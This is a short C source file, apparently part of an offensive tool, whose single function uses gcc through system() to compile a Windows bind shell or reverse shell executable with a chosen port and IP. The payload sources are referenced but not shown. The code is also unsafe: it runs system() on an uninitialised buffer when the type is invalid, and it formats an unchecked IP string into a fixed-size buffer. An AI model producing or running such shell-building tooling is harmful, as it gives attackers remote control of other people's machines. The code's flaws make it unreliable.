#include "shell.h"
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>

// Shell struct defined in .h file

void createShellExecutable(struct Shell shell) {
    char * cmd = (char*)malloc(256*sizeof(char));

    // use gcc to create the shell executable with the correct params
    if (shell.type == 0){
        printf("Creating bind shell executable...\n");
        sprintf(cmd, "gcc -D PORT=%d -D IP=%s -o bshell.exe shells/bindshell.c -lws2_32", shell.port, shell.ip);
    }
    else if (shell.type == 1){
        printf("Creating reverse shell executable...\n");
        sprintf(cmd, "gcc -D PORT=%d -D IP=%s -o rshell.exe shells/reverseshell.c -lws2_32", shell.port, shell.ip);
    }
    else{
        printf("Invalid type.\n");
    }
    system(cmd);
    free(cmd);

}



